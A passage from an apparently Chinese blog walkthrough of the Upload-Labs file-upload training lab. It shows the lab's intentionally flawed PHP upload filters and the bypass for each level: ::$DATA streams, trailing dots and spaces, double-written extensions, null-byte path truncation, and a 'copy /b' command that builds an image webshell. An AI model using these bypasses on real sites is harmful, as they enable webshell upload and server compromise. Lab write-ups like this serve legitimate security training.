class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>对比增加了首尾去空，没有了删除文件名末尾的点</p>\n<p>后缀加点 完成</p>\n<h2 id=\"data备用数据流漏洞\"><a class=\"markdownIt-Anchor\" href=\"#data备用数据流漏洞\">#</a> :: DATA 备用数据流漏洞</h2>\n<p>Windows 漏洞</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(<span class=\"variable\">$UPLOAD_ADDR</span>)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], <span class=\"variable\">$UPLOAD_ADDR</span> . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>])) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = <span class=\"variable\">$UPLOAD_ADDR</span> . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>修改后缀为 php 并在结尾添加::$DATA</p>\n<p>访问 shell.php</p>\n<h2 id=\"空格点绕过\"><a class=\"markdownIt-Anchor\" href=\"#空格点绕过\">#</a> 空格点绕过</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(<span class=\"variable\">$UPLOAD_ADDR</span>)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], <span class=\"variable\">$UPLOAD_ADDR</span> . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>])) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = <span class=\"variable\">$UPLOAD_ADDR</span> . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>去除了末尾的点和前后的空格，但只处理了一次</p>\n<p>改后缀为.php. .</p>\n<h2 id=\"双写后缀名绕过\"><a class=\"markdownIt-Anchor\" href=\"#双写后缀名绕过\">#</a> 双写后缀名绕过</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(<span class=\"variable\">$UPLOAD_ADDR</span>)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;php&quot;</span>,<span class=\"string\">&quot;php5&quot;</span>,<span class=\"string\">&quot;php4&quot;</span>,<span class=\"string\">&quot;php3&quot;</span>,<span class=\"string\">&quot;php2&quot;</span>,<span class=\"string\">&quot;html&quot;</span>,<span class=\"string\">&quot;htm&quot;</span>,<span class=\"string\">&quot;phtml&quot;</span>,<span class=\"string\">&quot;jsp&quot;</span>,<span class=\"string\">&quot;jspa&quot;</span>,<span class=\"string\">&quot;jspx&quot;</span>,<span class=\"string\">&quot;jsw&quot;</span>,<span class=\"string\">&quot;jsv&quot;</span>,<span class=\"string\">&quot;jspf&quot;</span>,<span class=\"string\">&quot;jtml&quot;</span>,<span class=\"string\">&quot;asp&quot;</span>,<span class=\"string\">&quot;aspx&quot;</span>,<span class=\"string\">&quot;asa&quot;</span>,<span class=\"string\">&quot;asax&quot;</span>,<span class=\"string\">&quot;ascx&quot;</span>,<span class=\"string\">&quot;ashx&quot;</span>,<span class=\"string\">&quot;asmx&quot;</span>,<span class=\"string\">&quot;cer&quot;</span>,<span class=\"string\">&quot;swf&quot;</span>,<span class=\"string\">&quot;htaccess&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = str_ireplace(<span class=\"variable\">$deny_ext</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$file_name</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], <span class=\"variable\">$UPLOAD_ADDR</span> . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$file_name</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = <span class=\"variable\">$UPLOAD_ADDR</span> . <span class=\"string\">&#x27;/&#x27;</span> .<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>提示看到会将这些后缀从文件名中去除，但是就执行了一遍</p>\n<p>双写绕过.pphpph</p>\n<h2 id=\"00截断get\"><a class=\"markdownIt-Anchor\" href=\"#00截断get\">#</a> 00 截断 GET</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$ext_arr</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file_ext</span> = substr(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>],strrpos(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>],<span class=\"string\">&quot;.&quot;</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(in_array(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$ext_arr</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;save_path&#x27;</span>].<span class=\"string\">&quot;/&quot;</span>.rand(<span class=\"number\">10</span>,<span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传失败！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>当 url 中的参数是通过 GET 方式获取时，%00 会被自动解码。而当参数是通过 POST 方式获取时，是不会自动解码的</p>\n<p>所以参数 post 是使用 00 截断时用 0x00，GET 时用 %00</p>\n<p>上传路径可控，</p>\n<p><a href=\"https://images.cnblogs.com/cnblogs_com/threesoil/1664657/o_200314165705upload1.png\"><img src=\"Upload-Labs/o_200314165705upload1.png\" class=\"lazyload placeholder\" data-srcset=\"Upload-Labs/o_200314165705upload1.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"img\"></a></p>\n<h2 id=\"00截断post\"><a class=\"markdownIt-Anchor\" href=\"#00截断post\">#</a> 00 截断 POST</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$ext_arr</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file_ext</span> = substr(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>],strrpos(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>],<span class=\"string\">&quot;.&quot;</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(in_array(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$ext_arr</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_path&#x27;</span>].<span class=\"string\">&quot;/&quot;</span>.rand(<span class=\"number\">10</span>, <span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传失败&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>和上一关差不多但是文件路径在 post 中所以得改 hex</p>\n<p><a href=\"https://images.cnblogs.com/cnblogs_com/threesoil/1664657/o_200314165709upload2.png\"><img src=\"Upload-Labs/o_200314165709upload2.png\" class=\"lazyload placeholder\" data-srcset=\"Upload-Labs/o_200314165709upload2.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"img\"></a></p>\n<p><strong>php 后添加两个空格方便修改 hex</strong></p>\n<p><a href=\"https://images.cnblogs.com/cnblogs_com/threesoil/1664657/o_200314165714upload3.png\"><img src=\"Upload-Labs/o_200314165714upload3.png\" class=\"lazyload placeholder\" data-srcset=\"Upload-Labs/o_200314165714upload3.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"img\"></a></p>\n<p>20 是空格的 hex, 将第一个 20 改为 00</p>\n<p>然后上传成功，连接成功</p>\n<h2 id=\"文件头检查\"><a class=\"markdownIt-Anchor\" href=\"#文件头检查\">#</a> 文件头检查</h2>\n<p>制作图片马 copy 1.jpg/b + 1.php/a 2.jpg 注意要用 1.php 不要用 1.txt</p>\n<p>不多细讲</p>\n<h2 id=\"图片马getimagesize绕过\"><a class=\"markdownIt-Anchor\" href=\"#图片马getimagesize绕过\">#</a> 图片马 getimagesize 绕过</h2>\n<p><code>getimagesize()</code>  函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p>\n<p>依旧使用图片马可以绕过</p>\n<h2 id=\"图片马exif_imagetype绕过\"><a class=\"markdownIt-Anchor\" href=\"#图片马exif_imagetype绕过\">#</a> 图片马 exif_imagetype 绕过</h2>\n<p>exif_imagetype 判断一个图像的类型</p>\n<p>依旧图片马绕过</p>\n<h2 id=\"图片二次渲染\"><a class=\"markdownIt-Anchor\" href=\"#图片二次渲染\">#</a> 图片二次渲染</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$filetype</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$tmpname</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$target_path</span>=<span class=\"variable\">$UPLOAD_ADDR</span>.basename(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获得上传文件的扩展名</span></span><br><span class=\"line\">    <span class=\"variable\">$fileext</span>= substr(strrchr(<span class=\"variable\">$filename</span>,<span class=\"string\">&quot;.&quot;</span>),<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>((<span class=\"variable\">$fileext</span> == <span class=\"string\">&quot;jpg&quot;</span>) &amp;&amp; (<span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$tmpname</span>,<span class=\"variable\">$target_path</span>))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"comment\">//使用上传的图片生成新的图片</span></span><br><span class=\"line\">            <span class=\"variable\">$im</span> = imagecreatefromjpeg(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$im</span> == <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"comment\">//给新图片指定文件名</span></span><br><span class=\"line\">                srand(time());</span><br><span class=\"line\">                <span class=\"variable\">$newfilename</span> = strval(rand()).<span class=\"string\">&quot;.jpg&quot;</span>;</span><br><span class=\"line\">                <span class=\"variable\">$newimagepath</span> = <span class=\"variable\">$UPLOAD_ADDR</span>.<span class=\"variable\">$newfilename</span>;</span><br><span class=\"line\">                imagejpeg(<span class=\"variable\">$im</span>,<span class=\"variable\">$newimagepath</span>);</span><br><span class=\"line\">                